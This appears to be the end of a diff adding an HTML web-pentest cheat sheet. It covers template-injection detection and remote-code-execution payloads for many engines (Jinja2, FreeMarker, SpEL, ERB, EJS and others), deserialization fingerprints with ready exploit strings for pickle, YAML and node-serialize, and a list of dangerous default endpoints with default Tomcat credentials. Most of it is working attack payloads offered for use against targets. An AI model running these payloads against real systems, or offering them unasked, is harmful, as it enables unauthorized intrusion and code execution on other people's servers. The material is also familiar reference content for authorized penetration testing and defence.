+<span class="comment"># GraphQL introspection query:</span>
+{"query":"{__schema{types{name,fields{name}}}}"}</div>
+
+<!-- ========================= SECTION 8: SSTI POLYGLOT ========================= -->
+<h2 id="s8">8. SSTI Polyglot &amp; Engine Detection <span class="tag">Identify template engine, then exploit</span></h2>
+
+<div class="codeblock">${{&lt;%[%'"}}%\   <span class="comment"># Universal SSTI detection polyglot &mdash; causes distinctive errors per engine</span></div>
+
+<table style="margin-top:10px;">
+<colgroup><col style="width:12%"><col style="width:18%"><col style="width:15%"><col style="width:28%"><col style="width:27%"></colgroup>
+<thead>
+<tr><th>Test Payload</th><th>Engine(s)</th><th>Language</th><th>Confirmation</th><th>RCE Primitive</th></tr>
+</thead>
+<tbody>
+<tr>
+  <td><code>{{7*7}}</code></td>
+  <td>Jinja2, Twig, Nunjucks, Liquid</td>
+  <td>Python / PHP / JS / Ruby</td>
+  <td>Returns <code>49</code>. Test <code>{{7*'7'}}</code>: Jinja2 &rarr; <code>7777777</code>, Twig &rarr; <code>49</code>.</td>
+  <td><strong>Jinja2:</strong> <code>{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}</code> or <code>{{ ''.__class__.__mro__[1].__subclasses__() }}</code><br><strong>Twig:</strong> <code>{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}</code></td>
+</tr>
+<tr>
+  <td><code>${7*7}</code></td>
+  <td>FreeMarker, Velocity, Thymeleaf, JSP EL, Spring SpEL</td>
+  <td>Java</td>
+  <td>Returns <code>49</code>.</td>
+  <td><strong>FreeMarker:</strong> <code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ ex("id") }</code><br><strong>Velocity:</strong> <code>#set($x=$rt.getRuntime().exec('id'))</code><br><strong>SpEL:</strong> <code>${T(java.lang.Runtime).getRuntime().exec('id')}</code></td>
+</tr>
+<tr>
+  <td><code>&lt;%= 7*7 %&gt;</code></td>
+  <td>ERB, EJS, ASP Classic</td>
+  <td>Ruby / Node.js</td>
+  <td>Returns <code>49</code>.</td>
+  <td><strong>ERB:</strong> <code>&lt;%= system('id') %&gt;</code> or <code>&lt;%= `id` %&gt;</code><br><strong>EJS:</strong> <code>&lt;%= process.mainModule.require('child_process').execSync('id') %&gt;</code></td>
+</tr>
+<tr>
+  <td><code>#{7*7}</code></td>
+  <td>Pug (Jade), Slim, Ruby interpolation</td>
+  <td>Node.js / Ruby</td>
+  <td>Returns <code>49</code>.</td>
+  <td><strong>Pug:</strong> <code>#{process.mainModule.require('child_process').execSync('id')}</code></td>
+</tr>
+<tr>
+  <td><code>{7*7}</code></td>
+  <td>Smarty, Handlebars (limited)</td>
+  <td>PHP / JS</td>
+  <td>Smarty &rarr; <code>49</code>. Handlebars is mostly logic-less.</td>
+  <td><strong>Smarty:</strong> <code>{php}echo `id`;{/php}</code> (pre-3.1) or <code>{system('id')}</code></td>
+</tr>
+<tr>
+  <td><code>{{= 7*7 }}</code></td>
+  <td>Underscore.js / Lodash templates</td>
+  <td>JavaScript</td>
+  <td>Returns <code>49</code>.</td>
+  <td><code>{{= global.process.mainModule.require('child_process').execSync('id') }}</code></td>
+</tr>
+<tr>
+  <td><code>@(7*7)</code></td>
+  <td>Razor</td>
+  <td>C#</td>
+  <td>Returns <code>49</code> (only if runtime compilation is used &mdash; rare in modern ASP.NET Core).</td>
+  <td><code>@{ System.Diagnostics.Process.Start("cmd","/c id"); }</code></td>
+</tr>
+<tr>
+  <td><code>*{7*7}</code></td>
+  <td>Thymeleaf (selection)</td>
+  <td>Java</td>
+  <td>Selection expression context.</td>
+  <td><code>*{T(java.lang.Runtime).getRuntime().exec('id')}</code></td>
+</tr>
+</tbody>
+</table>
+
+<!-- ========================= SECTION 9: DESERIALIZATION FINGERPRINTS ========================= -->
+<h2 id="s9">9. Deserialization Format Fingerprints <span class="tag">Spot untrusted deserialization in cookies / params / body</span></h2>
+<table>
+<colgroup><col style="width:20%"><col style="width:20%"><col style="width:30%"><col style="width:30%"></colgroup>
+<thead>
+<tr><th>Format / Language</th><th>Magic Bytes / Marker</th><th>How it Looks on the Wire</th><th>Gadget Chains / Tools</th></tr>
+</thead>
+<tbody>
+<tr>
+  <td><strong>Java ObjectOutputStream</strong></td>
+  <td><code>AC ED 00 05</code> (hex)<br>Base64: <code>rO0AB</code></td>
+  <td>Cookies, ViewState, JSESSIONID values, JSP session, RMI. Starts with <code>rO0AB</code> in Base64.</td>
+  <td><strong>ysoserial</strong>. Gadgets: CommonsCollections1-7, Spring1-2, JRE8u20, Jdk7u21, URLDNS (detection). Classpath dependency required.</td>
+</tr>
+<tr>
+  <td><strong>.NET BinaryFormatter</strong></td>
+  <td><code>00 01 00 00 00 FF FF FF FF</code><br>Base64: <code>AAEAAAD/////</code></td>
+  <td>ViewState (<code>__VIEWSTATE</code>), MAC-disabled, custom cookies, MSMQ. Also <code>LosFormatter</code>, <code>ObjectStateFormatter</code>, <code>SoapFormatter</code>, <code>NetDataContractSerializer</code>.</td>
+  <td><strong>ysoserial.net</strong>. Gadgets: TypeConfuseDelegate, TextFormattingRunProperties, PSObject, ActivitySurrogateSelector. <strong>CVE-2020-0618</strong> SQL Server Reporting Services.</td>
+</tr>
+<tr>
+  <td><strong>PHP serialize()</strong></td>
+  <td><code>O:{len}:"{class}":</code><br><code>a:{len}:{...}</code><br><code>s:{len}:"..."</code></td>
+  <td>Cookies (often Base64), session data, user input passed to <code>unserialize()</code>. Readable ASCII.</td>
+  <td><strong>PHPGGC</strong>. Gadgets: Laravel, Symfony, Guzzle, Monolog, WordPress, Drupal. PHAR deserialization via <code>phar://</code> wrapper.</td>
+</tr>
+<tr>
+  <td><strong>Python pickle</strong></td>
+  <td>Starts with <code>\x80\x04</code> (protocol 4) or <code>\x80\x03</code>.<br>Base64: <code>gAR</code> or <code>gAN</code></td>
+  <td>Django pickle sessions, Flask pickle sessions, RPC, message queues. <code>__reduce__</code> in JSON-ish output.</td>
+  <td>Direct RCE via <code>__reduce__</code>. Trivial: <code>class X: def __reduce__(self): return (os.system, ('id',))</code>.</td>
+</tr>
+<tr>
+  <td><strong>Python YAML (unsafe)</strong></td>
+  <td><code>!!python/object:</code><br><code>!!python/object/apply:</code><br><code>!!python/object/new:</code></td>
+  <td>YAML config files, <code>yaml.load()</code> without <code>SafeLoader</code>. Pre-PyYAML 5.1 default was unsafe.</td>
+  <td><code>!!python/object/apply:os.system ['id']</code>. Also <code>!!python/object/apply:subprocess.check_output [['id']]</code>.</td>
+</tr>
+<tr>
+  <td><strong>Ruby YAML (unsafe)</strong></td>
+  <td><code>!ruby/object:</code><br><code>!ruby/hash:</code></td>
+  <td>YAML config files, <code>YAML.load()</code> (pre Psych 4). Rails session cookies (legacy).</td>
+  <td>Gadget chains via ActiveSupport, ERB. Classic: <code>!ruby/object:Gem::Installer</code> chain.</td>
+</tr>
+<tr>
+  <td><strong>Ruby Marshal</strong></td>
+  <td><code>\x04\x08</code> magic bytes<br>Base64: <code>BAg</code></td>
+  <td>Rails session cookies (legacy, pre-JSON sessions), Redis sessions, memcache.</td>
+  <td>Universal-RXSS chain, <code>Gem::SpecFetcher</code> chain. <span class="cve">CVE-2022-32224</span> Marshal in Rails 5.2.</td>
+</tr>
+<tr>
+  <td><strong>Node.js node-serialize</strong></td>
+  <td><code>_$$ND_FUNC$$_</code> marker</td>
+  <td><code>node-serialize</code> library output (Base64 encoded).</td>
+  <td>Function reconstruction &rarr; RCE. <code>{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}</code>.</td>
+</tr>
+<tr>
+  <td><strong>Java XStream / Jackson</strong></td>
+  <td>XML with <code>&lt;object&gt;</code>, <code>&lt;class&gt;</code> tags. JSON with <code>@class</code>, <code>@type</code> fields.</td>
+  <td>REST APIs, SOAP services, message brokers.</td>
+  <td>Jackson polymorphic deserialization gadgets. <span class="cve">CVE-2017-9805</span> Struts XStream. <span class="cve">CVE-2017-7525</span> Jackson.</td>
+</tr>
+<tr>
+  <td><strong>JWT (not deserialization per se, but often conflated)</strong></td>
+  <td>Three Base64url segments: <code>eyJ...ey...</code>.</td>
+  <td>Authorization headers, cookies, URL params.</td>
+  <td><code>alg: none</code>, weak HS256 secret (jwt_tool, hashcat), RS256&rarr;HS256 confusion, kid header injection (SQLi/LFI/RCE), jku/x5u header forgery.</td>
+</tr>
+</tbody>
+</table>
+
+<!-- ========================= SECTION 10: DEFAULT DANGEROUS ENDPOINTS ========================= -->
+<h2 id="s10">10. Default Dangerous Endpoints <span class="tag">Always check these on any target</span></h2>
+<table>
+<colgroup><col style="width:18%"><col style="width:32%"><col style="width:50%"></colgroup>
+<thead>
+<tr><th>Category</th><th>Endpoint</th><th>What / Why</th></tr>
+</thead>
+<tbody>
+<tr>
+  <td rowspan="5"><strong>Admin Panels</strong></td>
+  <td><code>/admin/</code>, <code>/administrator/</code>, <code>/wp-admin/</code></td>
+  <td>WordPress, Joomla, Drupal, Django, custom admin interfaces. Version disclosure on login page.</td>
+</tr>
+<tr><td><code>/phpmyadmin/</code>, <code>/pma/</code>, <code>/adminer.php</code></td><td>Database management, version-specific RCEs, default creds.</td></tr>
+<tr><td><code>/manager/html</code> (Tomcat)</td><td>Default creds <code>tomcat:tomcat</code>, <code>admin:admin</code>. WAR file upload = RCE.</td></tr>
+<tr><td><code>/console</code> (WebLogic, Werkzeug)</td><td>Weblogic T3/IIOP RCE. Werkzeug debugger = instant RCE if PIN guessed.</td></tr>
+<tr><td><code>/CFIDE/administrator/</code></td><td>ColdFusion admin &mdash; multiple unauth RCEs.</td></tr>
+
+<tr>
+  <td rowspan="4"><strong>Debug / Profiler</strong></td>
+  <td><code>/debug/pprof/</code> (Go)</td>
+  <td>Go profiler &mdash; goroutine dumps, heap, CPU profiling. Leaks memory contents.</td>
+</tr>
+<tr><td><code>/_profiler/</code> (Symfony)</td><td>Symfony profiler &mdash; full request/response history, SQL queries, session data.</td></tr>
+<tr><td><code>/telescope</code>, <code>/debugbar/</code> (Laravel)</td><td>Laravel debug tools &mdash; massive info leak if exposed in prod.</td></tr>
+<tr><td><code>/__debug__/</code> (Django)</td><td>django-debug-toolbar &mdash; SQL, settings, templates.</td></tr>
+
+<tr>
+  <td rowspan="4"><strong>Management / Actuator</strong></td>
+  <td><code>/actuator/env</code>, <code>/actuator/heapdump</code> (Spring)</td>
+  <td>Environment variables, full JVM heap dump (contains passwords, tokens).</td>
+</tr>
+<tr><td><code>/actuator/jolokia/*</code> (Spring)</td><td>JMX over HTTP &mdash; MBean manipulation can lead to RCE.</td></tr>
+<tr><td><code>/hangfire</code> (ASP.NET)</td><td>Hangfire dashboard &mdash; background job execution, often unauth by default.</td></tr>
+<tr><td><code>/metrics</code>, <code>/healthz</code></td><td>Prometheus/K8s endpoints &mdash; may leak internal URLs, version info, hostnames.</td></tr>
+
+<tr>
+  <td rowspan="4"><strong>API Docs / Schema</strong></td>
+  <td><code>/swagger</code>, <code>/swagger-ui.html</code>, <code>/swagger-ui/index.html</code></td>
+  <td>Swagger UI &mdash; all endpoints, often with example requests and auth details.</td>
+</tr>
+<tr><td><code>/openapi.json</code>, <code>/v3/api-docs</code></td><td>OpenAPI schema &mdash; often exposed even when Swagger UI is hidden. FastAPI default.</td></tr>
+<tr><td><code>/graphql</code>, <code>/graphiql</code>, <code>/playground</code></td><td>GraphQL &mdash; introspection query <code>{__schema{types{name}}}</code> = full API map.</td></tr>
+<tr><td><code>/docs</code>, <code>/redoc</code>, <code>/api-docs</code></td><td>FastAPI /docs (Swagger UI), /redoc (ReDoc), generic API docs.</td></tr>
+
+<tr>
+  <td rowspan="3"><strong>Source &amp; Build</strong></td>
+  <td><code>/.git/config</code>, <code>/.git/HEAD</code></td>
+  <td>Exposed .git directory &mdash; dump with <code>git-dumper</code>, get full source history.</td>
+</tr>
+<tr><td><code>/.env</code>, <code>/.env.local</code>, <code>/.env.production</code></td><td>Secrets, DB credentials, API keys, APP_KEY.</td></tr>
+<tr><td><code>*.js.map</code>, <code>*.css.map</code></td><td>Source maps &mdash; full original source code reconstruction.</td></tr>
+
+<tr>
+  <td rowspan="3"><strong>File Upload / SSRF Surface</strong></td>
+  <td><code>/_next/image?url=</code> (Next.js)</td>
+  <td>Next.js image optimizer &mdash; SSRF if domains allowlist misconfigured.</td>
+</tr>
+<tr><td><code>/api/auth/callback/*</code> (NextAuth, oauth)</td><td>OAuth callback handlers &mdash; open redirect, state bypass.</td></tr>
+<tr><td><code>/webhook/*</code>, <code>/proxy/*</code></td><td>Generic SSRF surfaces.</td></tr>
+</tbody>
+</table>
+
+</body>
+</html>
